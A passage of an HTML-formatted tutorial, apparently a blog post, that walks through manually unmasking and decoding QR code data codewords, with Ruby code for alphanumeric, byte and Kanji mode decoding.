&lt;span class=&quot;no&quot;&gt;D3&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00110110&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00111101&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D4&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01110110&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01100010&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D5&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00100010&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11101001&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D6&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11110001&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b10100001&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D7&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00110111&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11100101&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D8&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01010010&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11010101&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D9&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00010111&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00101101&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11011110&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b10010111&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01000100&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b10001011&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01010100&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D25&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01111000&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11001101&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D26&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11000110&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After masking off,&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;D1&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00100000&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01001110&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D2&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00110100&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01011001&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D3&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11111010&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00001110&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D4&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01000101&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01010001&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D5&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00010001&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11011010&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D6&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00111101&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b10010010&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D7&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00000100&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11010101&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D8&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b10011110&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00011001&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D9&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11010100&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00010001&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00010100&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00001110&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11011101&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00010010&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b11010010&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D25&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b00011111&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01010100&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;D26&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;0b01000000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now we can start decoding the data.&lt;/p&gt;

&lt;h2&gt;Data Decoding&lt;/h2&gt;

&lt;p&gt;There are &lt;a href=&quot;http://www.thonky.com/qr-code-tutorial/data-encoding/#step-3-add-the-mode-indicator&quot;&gt;mode indicators&lt;/a&gt; for decoding:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0001&lt;/code&gt;: Numeric Mode (10 bits per 3 digits)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0010&lt;/code&gt;: Alphanumeric Mode (11 bits per 2 characters)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0100&lt;/code&gt;: Byte Mode (8 bits per character)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1000&lt;/code&gt;: Kanji Mode (13 bits per character)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0111&lt;/code&gt;: ECI Mode&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;http://www.thonky.com/qr-code-tutorial/data-encoding/#step-4-add-the-character-count-indicator&quot;&gt;Character count indicator&lt;/a&gt; follows after a mode indicator.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Version 1&amp;ndash;9

&lt;ul&gt;
&lt;li&gt;Numeric mode: 10 bits&lt;/li&gt;
&lt;li&gt;Alphanumeric mode: 9 bits&lt;/li&gt;
&lt;li&gt;Byte mode: 8 bits&lt;/li&gt;
&lt;li&gt;Kanji mode: 8 bits&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Version 10&amp;ndash;26

&lt;ul&gt;
&lt;li&gt;Numeric mode: 12 bits&lt;/li&gt;
&lt;li&gt;Alphanumeric mode: 11 bits&lt;/li&gt;
&lt;li&gt;Byte mode: 16 bits&lt;/li&gt;
&lt;li&gt;Kanji mode: 10 bits&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Version 27&amp;ndash;40

&lt;ul&gt;
&lt;li&gt;Numeric mode: 14 bits&lt;/li&gt;
&lt;li&gt;Alphanumeric mode: 13 bits&lt;/li&gt;
&lt;li&gt;Byte mode: 16 bits&lt;/li&gt;
&lt;li&gt;Kanji mode: 12 bits&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;See the encoding process for each mode:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.thonky.com/qr-code-tutorial/numeric-mode-encoding/&quot;&gt;Numeric Mode Encoding&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.thonky.com/qr-code-tutorial/alphanumeric-mode-encoding/&quot;&gt;Alphanumeric Mode Encoding&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.thonky.com/qr-code-tutorial/byte-mode-encoding/&quot;&gt;Byte Mode Encoding&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.thonky.com/qr-code-tutorial/kanji-mode-encoding/&quot;&gt;Kanji Mode Encoding&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let&amp;rsquo;s start with above data D1&amp;ndash;D26:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;00100000&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00110100&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;11111010&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;01000101&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00010001&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00111101&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00000100&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;10011110&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;11010100&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00010100&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;11011101&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;11010010&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;01010100&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;01001110&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;01011001&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00001110&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;01010001&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;11011010&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;10010010&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;11010101&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00011001&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00010001&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00001110&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00010010&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;00011111&#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;&#39;01000000&#39;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;alphanumeric&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ $%*+-./:&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chars&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;slice!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kanji&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1740&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC140&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Shift_JIS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;UTF_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8140&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Shift_JIS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;UTF_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;kp&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;0010&#39;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Alphanumeric&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alphanumeric&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alphanumeric&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alphanumeric&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;odd?&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;0100&#39;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Byte&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
